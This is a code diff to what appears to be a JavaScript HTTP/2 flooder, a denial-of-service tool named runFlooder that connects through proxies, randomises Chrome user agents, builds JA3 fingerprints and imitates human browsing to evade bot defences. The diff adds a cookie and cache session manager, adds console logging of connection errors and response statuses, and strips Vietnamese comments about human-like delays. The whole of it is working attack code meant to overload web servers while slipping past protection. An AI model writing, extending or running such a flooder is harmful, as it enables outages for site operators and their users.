@@ -419,6 +419,43 @@ function uapick(browser, version, platform, isMobile, fullVersion) {
     return userAgents[browser];
 }
 
+class SessionManager {
+    constructor() {
+        this.cookies = new Map();
+        this.cache = new Map();
+    }
+
+    addCookies(host, cookies) {
+        if (!this.cookies.has(host)) {
+            this.cookies.set(host, new Map());
+        }
+        const cookieMap = this.cookies.get(host);
+        cookies.forEach(cookie => {
+            const [name, value] = cookie.split(';')[0].split('=');
+            cookieMap.set(name.trim(), value.trim());
+        });
+    }
+
+    getCookieHeader(host) {
+        if (!this.cookies.has(host)) return null;
+        const cookieMap = this.cookies.get(host);
+        return Array.from(cookieMap.entries()).map(([name, value]) => `${name}=${value}`).join('; ');
+    }
+
+    addCacheHeaders(path, etag, lastModified) {
+        if (!this.cache.has(path)) {
+            this.cache.set(path, {});
+        }
+        const cacheEntry = this.cache.get(path);
+        if (etag) cacheEntry.etag = etag;
+        if (lastModified) cacheEntry.lastModified = lastModified;
+    }
+
+    getCacheHeaders(path) {
+        return this.cache.get(path) || null;
+    }
+}
+
 function getRandomUA() {
     const version = Math.floor(Math.random() * (139 - 127 + 1)) + 127;
     return `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
@@ -531,7 +568,10 @@ function runFlooder() {
     };
 
     Socker.HTTP(proxyOptions, async (connection, error) => {
-        if (error) return;
+        if (error) {
+            console.log(`[Error] Proxy connection failed: ${error}`);
+            return;
+        }
         connection.setKeepAlive(true, 600000);
         connection.setNoDelay(true);
 
@@ -571,6 +611,7 @@ function runFlooder() {
             const cipherInfo = socket.getCipher();
             const supportedVersions = socket.getProtocol();
             if (!cipherInfo) {
+                console.log('[Error] Failed to generate JA3 fingerprint: No cipher info');
                 return null;
             }
             const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
@@ -581,6 +622,11 @@ function runFlooder() {
 
         tlsSocket.on('connect', () => {
             const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
+            console.log(`[Info] TLS connected, JA3: ${ja3Fingerprint}`);
+        });
+
+        tlsSocket.on('error', (err) => {
+            console.log(`[Error] TLS error: ${err.message}`);
         });
 
         function getSettingsBasedOnISP(isp) {
@@ -651,7 +697,7 @@ function runFlooder() {
             return settings;
         }
 
-        let hpack = new HPACK();
+    let hpack = new HPACK();
         let client;
         const clients = [];
         client = http2.connect(parsedTarget.href, {
@@ -671,8 +717,15 @@ function runFlooder() {
         });
 
         client.on('connect', () => {
-            client.ping((err, duration, payload) => {});
+            console.log('[Info] HTTP/2 connected');
+            client.ping((err, duration, payload) => {
+                if (err) console.log(`[Error] Ping failed: ${err.message}`);
+            });
             client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
+        });
+
+        client.on('error', (err) => {
+            console.log(`[Error] HTTP/2 error: ${err.message}`);
         });
 
         const sessionManager = new SessionManager();
@@ -681,7 +734,7 @@ function runFlooder() {
             const intervalId = setInterval(async () => {
                 async function sendRequests() {
                     if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
-                        const navigationSequence = resourcePaths.slice(0, Math.floor(Math.random() * 3) + 1); // Chọn 1-3 tài nguyên ngẫu nhiên
+                        const navigationSequence = resourcePaths.slice(0, Math.floor(Math.random() * 3) + 1);
 
                         for (const resource of navigationSequence) {
                             const requestPromise = new Promise(async (resolve, reject) => {
@@ -721,6 +774,7 @@ function runFlooder() {
                                     exclusive: Math.random() < 0.5 ? true : false,
                                 })
                                 .on('response', response => {
+                                    console.log(`[Info] Request to ${selectedPath} - Status: ${response[':status']}`);
                                     const setCookie = response['set-cookie'];
                                     if (setCookie) {
                                         sessionManager.addCookies(parsedTarget.host, Array.isArray(setCookie) ? setCookie : [setCookie]);
@@ -737,6 +791,7 @@ function runFlooder() {
                                     resolve();
                                 })
                                 .on('error', (err) => {
+                                    console.log(`[Error] Request to ${selectedPath} failed: ${err.message}`);
                                     reject(err);
                                 });
 
@@ -748,16 +803,17 @@ function runFlooder() {
                             });
 
                             await requestPromise.catch(() => {});
-                            await new Promise(resolve => setTimeout(resolve, getRandomInt(1000, 3000))); // Độ trễ ngẫu nhiên
+                            await new Promise(resolve => setTimeout(resolve, getRandomInt(1000, 3000)));
                         }
                     }
                 }
 
                 await sendRequests();
-            }, getRandomInt(5000, 10000)); // Interval giống người dùng
+            }, getRandomInt(5000, 10000));
         });
 
         client.on("close", () => {
+            console.log('[Info] HTTP/2 client closed');
             client.destroy();
             tlsSocket.destroy();
             connection.destroy();
@@ -765,6 +821,7 @@ function runFlooder() {
         });
 
         client.on("error", error => {
+            console.log(`[Error] HTTP/2 client error: ${error.message}`);
             client.destroy();
             connection.destroy();
             return runFlooder();
